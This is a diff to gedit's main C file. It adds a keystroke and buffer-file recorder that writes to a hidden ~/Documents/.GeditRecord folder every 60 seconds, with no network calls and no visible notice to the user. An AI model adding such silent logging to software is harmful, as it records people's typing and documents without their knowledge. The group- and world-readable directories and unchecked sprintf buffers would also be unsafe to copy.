@@ -57,6 +57,12 @@
 #include "gedit-utils.h"
 #include "gedit-window.h"
 
+//**********keystroke************//
+#include <sys/time.h>
+#include <sys/stat.h>
+#include <pthread.h>
+//*******************************//
+
 #include "eggsmclient.h"
 #include "eggdesktopfile.h"
 
@@ -75,6 +81,37 @@
 #include <ige-mac-dock.h>
 #include "osx/gedit-osx.h"
 #endif
+
+///////////keystroke/////////////
+	extern char subDirName[100];
+	extern FILE *fpKeystroke, *fpInterBuffer;
+	extern guint keyCount;
+	extern guint lastKeyCount;
+	extern char keyStrokeBuffer[1000000];
+	extern int keyStrokeBufferPos;
+	extern int maxKeyStroke;
+	extern char fileNames[2000][200];
+	extern char bufferFiles[2000][30000];
+	extern int numOfBufferFiles;
+	extern pthread_mutex_t myMutex;
+
+	char subDirName[100];
+	char dirName[100];
+	FILE *fpKeystroke, *fpInterBuffer;
+	guint keyCount = 0;
+	guint lastKeyCount = 0;
+	char keyStrokeBuffer[1000000];
+	int keyStrokeBufferPos = 0;
+	int maxKeyStroke = 2000;
+	char fileNames[2000][200];
+	char bufferFiles[2000][30000];
+	char fileNames2[2000][200];
+	char bufferFiles2[2000][30000];
+	int numOfBufferFiles = 0;
+
+	pthread_t ntid;
+	pthread_mutex_t myMutex = PTHREAD_MUTEX_INITIALIZER;
+/////////////////////////////////
 
 static guint32 startup_timestamp = 0;
 
@@ -539,6 +576,50 @@ setup_path (void)
 }
 #endif
 
+///////////keystroke/////////
+
+void printids(const char *s)  {      pid_t pid;      pthread_t tid;        pid = getpid();      tid = pthread_self();      printf("%s pid %u tid %u (0x%x)\n",s,(unsigned int)pid,(unsigned int)tid,(unsigned int)tid);    } 
+   void *thread(void *arg)  {  
+	int i = 0;
+	while(1){
+    		printids("new thread:");
+		pthread_mutex_lock(&myMutex);
+
+		fprintf(fpKeystroke, "%s", keyStrokeBuffer);
+	    	fflush(fpKeystroke);
+		keyStrokeBuffer[0] = '\0';
+		keyStrokeBufferPos = 0;
+	
+	
+		int numOfBufferFiles2 = numOfBufferFiles;
+		for(i = 0; i < numOfBufferFiles2; i++){
+		    strcpy(fileNames2[i], fileNames[i]);
+		    strcpy(bufferFiles2[i], bufferFiles[i]);
+		}
+		numOfBufferFiles = 0;		
+		pthread_mutex_unlock(&myMutex);
+
+		for (i = 0; i < numOfBufferFiles2; i++){
+		    //printf(">>>>>>>%s\n", fileNames2[i]);
+		    fpInterBuffer = fopen(fileNames2[i], "w+");
+	    	    if(fpInterBuffer == NULL){
+		    	//printf("failed to open interBufferFile\n");	
+	       	    } else{
+			//printf("%s\n", fileNames[i]);
+			fprintf(fpInterBuffer, "%s", bufferFiles2[i]);
+			fclose(fpInterBuffer);
+	    	    }
+		}
+
+		
+
+
+		sleep(60); 
+	}    	return ((void *)0);  }  
+
+/////////////////////////////
+
+
 int
 main (int argc, char *argv[])
 {
@@ -550,6 +631,55 @@ main (int argc, char *argv[])
 	GError *error = NULL;
 	gchar *dir;
 	gchar *icon_dir;
+
+////////////keystroke///////////////
+	//printf("initializing\n");
+
+	//get the current date
+	time_t current_time;
+	struct tm *cal_time;
+
+	char newDirName[200];
+	
+	time(&current_time);
+	cal_time = gmtime(&current_time);
+	current_time = time(NULL);
+	
+	sprintf(subDirName, "%d-%d-%d_%d:%d:%d", (1900 + cal_time->tm_year), (1 + cal_time->tm_mon), cal_time->tm_mday, cal_time->tm_hour, cal_time->tm_min, cal_time->tm_sec);
+
+	printf("%d/%d/%d %d:%d:%d\n", (1900 + cal_time->tm_year), (1 + cal_time->tm_mon), cal_time->tm_mday, cal_time->tm_hour, cal_time->tm_min, cal_time->tm_sec);
+
+	int status;
+	sprintf(dirName, "%s/Documents/.GeditRecord", getenv("HOME"));
+	status = mkdir(dirName, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH); 
+	
+	sprintf(newDirName, "%s/%s", dirName, subDirName);
+	status = mkdir(newDirName, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
+
+	sprintf(newDirName, "%s/%s/interBufferFiles", dirName, subDirName);
+	status = mkdir(newDirName, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH); 
+	
+	keyCount = 0;
+
+	sprintf(newDirName, "%s/%s/keyRecord.txt", dirName, subDirName);
+	fpKeystroke = fopen(newDirName,"w+");
+	if(fpKeystroke == NULL){
+		printf("failed to open key stroke record file\n");	
+	}
+	//printf("initialization finished\n");
+
+
+	/////create a new thread periodically write files//////
+
+	int temp;      	if((temp=pthread_create(&ntid,NULL,thread,NULL))!= 0)      	{          	printf("can't create thread: %s\n",strerror(temp));          	return 1;       	}  
+
+	/////create a queue to buffter the intermediate buffer files///s//
+	
+	
+
+	/////use a global string variable to buffer the keystroke/////
+
+/////////////////////////////
 
 	/* Init type system as soon as possible */
 	g_type_init ();
@@ -748,6 +878,33 @@ main (int argc, char *argv[])
 	g_object_unref (engine);
 	gedit_prefs_manager_app_shutdown ();
 	gedit_metadata_manager_shutdown ();
+
+
+//////////////keystroke////////////
+	pthread_mutex_lock(&myMutex);
+
+	fprintf(fpKeystroke, "%s", keyStrokeBuffer);
+	fflush(fpKeystroke);
+	keyStrokeBuffer[0] = '\0';
+	keyStrokeBufferPos = 0;
+
+	int i = 0;
+	for (i = 0; i < numOfBufferFiles; i++){
+	    //printf(">>>>>>>%s\n", fileNames[i]);
+	    fpInterBuffer = fopen(fileNames[i], "w+");
+    	    if(fpInterBuffer == NULL){
+	    	//printf("failed to open interBufferFile\n");	
+       	    } else{
+		//printf("%s\n", fileNames[i]);
+		fprintf(fpInterBuffer, "%s", bufferFiles[i]);
+		fclose(fpInterBuffer);
+    	    }
+	}
+
+	numOfBufferFiles = 0;
+	pthread_mutex_unlock(&myMutex);
+
+///////////////////////////////////
 
 	return 0;
 }
